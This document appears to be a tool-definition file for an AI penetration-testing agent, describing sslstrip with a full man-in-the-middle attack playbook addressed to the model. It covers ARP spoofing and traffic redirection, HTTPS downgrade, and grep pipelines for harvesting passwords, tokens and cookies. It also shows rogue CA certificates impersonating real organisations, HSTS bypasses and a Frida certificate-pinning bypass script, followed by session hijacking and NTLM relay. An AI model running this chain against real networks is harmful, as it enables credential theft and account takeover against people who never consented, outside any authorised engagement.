# sslstrip

## Overview
- Tool name: `sslstrip`
- Enabled in config: `true`
- Executable: `sslstrip`
- Default args: none
- Summary: HTTPS stripping MITM tool for credential interception, cookie theft, and TLS downgrade attacks

## Detailed Description
SSLStrip is a Man-in-the-Middle attack tool that transparently downgrades HTTPS connections to HTTP, allowing an attacker in a network position to intercept credentials, session tokens, cookies, and other secrets that would normally be encrypted by TLS.

**Attack Principle:**
The attacker gains a network position (ARP spoofing, rogue AP, DHCP poisoning) and redirects the victim's HTTP traffic through SSLStrip. When the victim's browser follows an HTTPS link, SSLStrip maintains the HTTPS connection to the real server but serves the content back to the victim over plain HTTP. The victim sees HTTP URLs instead of HTTPS, and all form submissions, API calls, and sensitive data flow through the attacker in cleartext.

**Key Features:**
- Transparent HTTPS → HTTP downgrade in real-time
- Full credential and session token interception
- POST data logging (usernames, passwords, API keys)
- Cookie secure flag stripping
- Favicon lock icon spoofing
- Session kill for forcing reconnection through proxy
- Comprehensive traffic logging

## Parameters
### `listen_port`
- Type: `int`
- Required: `false`
- Flag: `-l`
- Format: `flag`
- Default: `10000`
- Description: Port to listen on for redirected HTTP traffic. Must match the iptables REDIRECT rule.

### `logfile`
- Type: `string`
- Required: `false`
- Flag: `-w`
- Format: `flag`
- Description: Output file for intercepted data (credentials, cookies, POST data). Default: sslstrip.log

### `favicon`
- Type: `bool`
- Required: `false`
- Flag: `-f`
- Format: `flag`
- Default: `False`
- Description: Replace site favicon with lock icon for social engineering

### `killsessions`
- Type: `bool`
- Required: `false`
- Flag: `-k`
- Format: `flag`
- Default: `False`
- Description: Kill active HTTPS sessions to force reconnection through proxy

### `post_only`
- Type: `bool`
- Required: `false`
- Flag: `-p`
- Format: `flag`
- Default: `False`
- Description: Only log POST requests (credentials, form data)

### `all_traffic`
- Type: `bool`
- Required: `false`
- Flag: `-a`
- Format: `flag`
- Default: `False`
- Description: Log all traffic including headers and response bodies

### `additional_args`
- Type: `string`
- Required: `false`
- Format: `positional`
- Description: Additional sslstrip parameters

## Invocation Template
```
sslstrip -l 10000 -w sslstrip.log -f -k
```

## Model Usage Guidance
SSLStrip requires a network position before it can intercept traffic. The standard attack chain involves multiple tools:

### Prerequisites Setup
Before running sslstrip, the attacker must:
1. Gain a Man-in-the-Middle position on the network
2. Enable IP forwarding on the attack machine
3. Set up traffic redirection with iptables

### Complete Attack Playbook

#### Phase 1: Network Position (ARP Spoofing)
```bash
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Set iptables redirect: HTTP traffic → SSLStrip listener
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 10000

# ARP spoof - pretend to be the gateway
arpspoof -i eth0 -t <target_ip> <gateway_ip>
# In another terminal, reverse direction:
arpspoof -i eth0 -t <gateway_ip> <target_ip>
```

#### Phase 2: SSLStrip Execution
```bash
# Basic credential capture
sslstrip -l 10000 -w /tmp/sslstrip_creds.log -f -k

# POST-only mode (less noise, focused on credentials)
sslstrip -l 10000 -w /tmp/sslstrip_creds.log -p -k

# Full traffic capture (forensic-grade)
sslstrip -l 10000 -w /tmp/sslstrip_full.log -a -k
```

#### Phase 3: Credential Extraction
```bash
# Monitor captured credentials in real-time
tail -f /tmp/sslstrip_creds.log | grep -i -E "pass|pwd|token|cookie|session|auth|key|secret|login|user"

# Extract POST form data
grep -i "POST" /tmp/sslstrip_creds.log

# Extract cookies
grep -i "Set-Cookie\|Cookie:" /tmp/sslstrip_creds.log

# Extract Authorization headers
grep -i "Authorization\|Bearer\|Basic" /tmp/sslstrip_creds.log
```

### Secret Extraction Targets

SSLStrip can intercept the following types of secrets:

| Secret Type | Where Found | Example Pattern |
|-------------|-------------|-----------------|
| Login credentials | POST form data | `username=admin&password=P@ssw0rd` |
| Session cookies | Cookie headers | `Set-Cookie: PHPSESSID=abc123; secure` → strips `secure` flag |
| API tokens | Authorization headers | `Authorization: Bearer eyJhbG...` |
| OAuth tokens | Redirect URLs | `?access_token=ya29.a0AfH6...` |
| CSRF tokens | Hidden form fields | `<input name="csrf_token" value="...">` |
| JWT tokens | Headers/cookies | `Authorization: Bearer eyJhbGci...` |
| API keys | Query params / headers | `?api_key=AIzaSy...` or `X-API-Key: ...` |
| Basic auth | Authorization header | `Authorization: Basic dXNlcjpwYXNz` (base64) |
| NTLM hashes | WWW-Authenticate | NTLM challenge-response in HTTP auth |
| 2FA codes | POST data | `otp=123456&token=...` |

### Certificate Swapping & MITM Certificates

For targets that require full HTTPS interception (not just stripping), combine SSLStrip with certificate-based MITM:

#### Method 1: SSLStrip + mitmproxy (Full HTTPS MITM)
```bash
# Generate mitmproxy CA cert
mitmproxy --mode transparent

# Install CA cert on target device
# The cert is at ~/.mitmproxy/mitmproxy-ca-cert.pem

# For Cuttlefish Android VM:
# cuttlefish_install_cert with cert_path=~/.mitmproxy/mitmproxy-ca-cert.pem

# Run mitmproxy as transparent proxy
mitmproxy --mode transparent --listen-port 8080 --ssl-insecure

# iptables redirect HTTPS traffic
iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8080
```

#### Method 2: Custom CA Certificate Generation
```bash
# Generate a rogue CA
openssl genrsa -out rogue_ca.key 4096
openssl req -new -x509 -days 3650 -key rogue_ca.key -out rogue_ca.crt \
    -subj "/C=RU/ST=Moscow/O=Roskomnadzor/CN=Trusted Root CA"

# Generate target-specific certificate signed by rogue CA
openssl genrsa -out target.key 2048
openssl req -new -key target.key -out target.csr \
    -subj "/C=US/ST=CA/O=Target Corp/CN=mail.target.com"
openssl x509 -req -in target.csr -CA rogue_ca.crt -CAkey rogue_ca.key \
    -CAcreateserial -out target.crt -days 365 \
    -extfile <(printf "subjectAltName=DNS:mail.target.com,DNS:*.target.com")

# Install rogue CA on victim device to make all certs trusted
# On Android (Cuttlefish): use cuttlefish_install_cert tool
# On Windows: certutil -addstore Root rogue_ca.crt
# On Linux: cp rogue_ca.crt /usr/local/share/ca-certificates/ && update-ca-certificates
```

#### Method 3: Bettercap (Modern All-in-One Alternative)
```bash
# Bettercap with built-in SSLStrip module
bettercap -iface eth0 -eval "set arp.spoof.targets <target_ip>; arp.spoof on; set sslstrip.enabled true; set sslstrip.log /tmp/sslstrip.log; net.sniff on"

# Bettercap with HSTS bypass (sslstrip2 mode)
bettercap -caplet hstshijack/hstshijack
```

### HSTS Bypass Techniques

Modern browsers enforce HSTS (HTTP Strict Transport Security) which prevents SSLStrip from working on known HSTS sites. Bypass methods:

1. **sslstrip2/sslstrip+ (Leonardo Nve's enhancement):**
   - Rewrites domains: `accounts.google.com` → `accounts.google.com.attacker.com`
   - DNS proxy resolves the rewritten domain to the real IP
   - Bypasses HSTS because the rewritten domain has no HSTS policy
   ```bash
   # sslstrip2 + dns2proxy
   python sslstrip2.py -l 10000 -w /tmp/creds.log
   python dns2proxy.py  # handles rewritten domain resolution
   ```

2. **NTP attack (HSTS expiry):**
   - Spoof NTP to set victim's clock far into the future
   - HSTS max-age expires, allowing SSLStrip to work
   - Requires NTP spoofing capability (delorean tool)

3. **HSTS preload list domains:**
   - Cannot be bypassed - Chrome, Firefox, Safari hardcode these
   - Google, Facebook, Twitter, PayPal etc. are preloaded
   - Focus on targets NOT in the preload list

### Mobile App Testing with Cuttlefish Integration

SSLStrip integrates with CyberStrikeAI's Cuttlefish Android VM tools for mobile security testing:

```
Workflow:
1. cuttlefish_launch          → Start Android VM
2. cuttlefish_install_apk     → Install target app
3. Set up SSLStrip on host    → sslstrip -l 10000 -w /tmp/app_creds.log -k
4. cuttlefish_proxy set       → Route device traffic through SSLStrip
5. cuttlefish_install_cert    → Install rogue CA for full HTTPS interception
6. cuttlefish_droidrun        → "Open the app and log in with test credentials"
7. Analyze /tmp/app_creds.log → Extract intercepted API calls and tokens
8. cuttlefish_frida_setup     → Set up Frida for cert pinning bypass if needed
```

**Certificate Pinning Bypass (when SSLStrip alone fails):**
```javascript
// Frida script to disable certificate pinning (Android)
Java.perform(function() {
    // TrustManager bypass
    var TrustManagerImpl = Java.use('com.android.org.conscrypt.TrustManagerImpl');
    TrustManagerImpl.verifyChain.implementation = function() {
        return arguments[0]; // Accept all certs
    };

    // OkHttp CertificatePinner bypass
    var CertificatePinner = Java.use('okhttp3.CertificatePinner');
    CertificatePinner.check.overload('java.lang.String', 'java.util.List').implementation = function() {
        return; // Skip pin check
    };
});
```

### Defense Detection and Evasion

**What SSLStrip bypasses:**
- Basic HTTPS redirects (301/302 to HTTPS)
- `Secure` cookie flags (strips them)
- `<meta http-equiv="Content-Security-Policy">` (strips upgrade-insecure-requests)
- Form action URLs pointing to HTTPS

**What SSLStrip does NOT bypass:**
- HSTS preloaded domains (hardcoded in browser)
- HSTS with long max-age (until expiry or NTP attack)
- Certificate pinning in mobile apps (need Frida bypass)
- Browser "Not Secure" warning (HTTP pages show this in address bar)
- Content-Security-Policy headers with upgrade-insecure-requests (server-side)

### Log Analysis & Post-Exploitation

After capturing credentials with SSLStrip:

```bash
# Parse sslstrip log for credentials
python3 -c "
import re, sys
with open('/tmp/sslstrip_creds.log') as f:
    for line in f:
        # Find POST data with password-like fields
        if any(k in line.lower() for k in ['pass', 'pwd', 'token', 'auth', 'session', 'key', 'secret']):
            print(line.strip())
"

# Decode base64 Basic auth
echo 'dXNlcjpwYXNzd29yZA==' | base64 -d

# Use captured session cookies for session hijacking
curl -b "PHPSESSID=captured_session_id" https://target.com/admin/

# Use captured API tokens
curl -H "Authorization: Bearer captured_token" https://api.target.com/v1/users

# Relay captured NTLM hashes
impacket-ntlmrelayx -t smb://dc.target.com -smb2support
```

### Complementary Tools Chain

| Tool | Role in MITM Chain |
|------|-------------------|
| `arpspoof` / `ettercap` | Gain network position via ARP poisoning |
| `responder` | LLMNR/NBT-NS/WPAD poisoning for initial position |
| `sslstrip` | HTTPS → HTTP downgrade for credential capture |
| `bettercap` | Modern all-in-one MITM framework (includes SSLStrip) |
| `mitmproxy` | Full HTTPS interception with custom CA certificates |
| `Wireshark` / `tcpdump` | Packet capture verification and analysis |
| `Frida` | Mobile certificate pinning bypass |
| `impacket` | NTLM relay for captured hashes |
| `hashcat` / `john` | Offline cracking of captured hashes |
| `cuttlefish_*` tools | Android VM for mobile app certificate testing |
